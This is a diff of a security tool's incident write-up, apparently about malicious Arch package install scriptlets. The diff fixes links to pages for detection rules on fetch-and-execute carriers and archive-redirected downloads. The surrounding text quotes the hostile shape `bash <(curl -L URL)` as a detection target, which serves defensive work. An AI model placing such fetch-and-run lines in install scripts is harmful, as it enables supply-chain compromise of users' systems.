@@ -55,7 +55,7 @@ Reproduced against the committed bytes today, the picture is broader. The
 install-scriptlet rules claim the carrier - `H075` (an install hook that fetches
 and runs foreign code), with the process-substitution shape `H090` and `C032` -
 and the crossfire rule
-[X034](../reference/rules/crossfire.md#x034) names the archival indirection
+[X034](../rules/crossfire.md#x034) names the archival indirection
 itself, so the *technique* is reported even where a payload rule caught the
 bytes. **X034 was written after this incident**, from the pattern these two waves
 left: the copy-pasted payload is exactly the case crossfire exists for, and the
@@ -89,7 +89,7 @@ The live cycle raised the alarm from the *correlation* layer, not the payload;
 every payload rule below arrived in the days after. This is what the incident
 changed.
 
-- **[C032](../reference/rules/install-and-persist.md#c032) reads the top-level
+- **[C032](../rules/install-and-persist.md#c032) reads the top-level
   scriptlet.** `H017` and `C016` scope to function bodies and the scope map
   omits top-level lines, so nothing read an install scriptlet outside a hook -
   yet pacman sources an `.install` on every operation and a bare top-level line
@@ -97,13 +97,13 @@ changed.
   `bash <(curl -L URL)`. C032 parses the committed scriptlet, stands down on an
   unparseable partial read, and matches command-position execution outside every
   function; where one line carries both shapes, `H090` claims the finding.
-- **[H090](../reference/rules/fetch-and-execution.md#h090) reads the
+- **[H090](../rules/fetch-and-execution.md#h090) reads the
   process-substitution carrier.** Its committed-carrier pattern was pipe-keyed,
   so the `bash <(curl ...)` shape both waves shipped scored zero in the manifest
   scan: every watch cycle after the introduction, and any state scan without a
   diff, saw nothing. Two arms now reuse `H075`'s group-free process-substitution
   patterns, so the carrier the rule already existed to catch is read.
-- **[X034](../reference/rules/crossfire.md#x034) names the archival transit.**
+- **[X034](../rules/crossfire.md#x034) names the archival transit.**
   The fetch was laundered through `web.archive.org` as a redirector to a fresh
   origin, so the trusted host and the serving host differ. X034 fires on that
   indirection itself and stands down on a plain `curl`/`wget` to a shell, so the
